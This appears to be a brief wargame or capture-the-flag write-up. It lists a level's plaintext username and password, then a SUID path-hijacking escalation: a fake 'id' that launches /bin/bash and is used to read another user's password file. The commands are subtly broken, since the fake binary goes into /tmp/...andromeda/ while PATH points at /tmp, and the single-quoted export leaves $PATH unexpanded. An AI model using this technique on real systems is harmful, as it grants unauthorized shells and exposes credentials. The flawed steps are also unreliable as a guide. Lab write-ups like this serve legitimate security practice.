# username
andromeda
# password
OTWGTbHzrxhYFSTlKcOt
# objective
The user anthea reminds us who we are.
# method of solve
The SUID binary in the home directory makes reference to the ID command. We can do path hijacking. So...
```
mkdir /tmp/...andromeda/
echo '/bin/bash' > /tmp/...andromeda/id
export 'PATH=/tmp:$PATH'
./uid
cat anthea_pass.txt
```
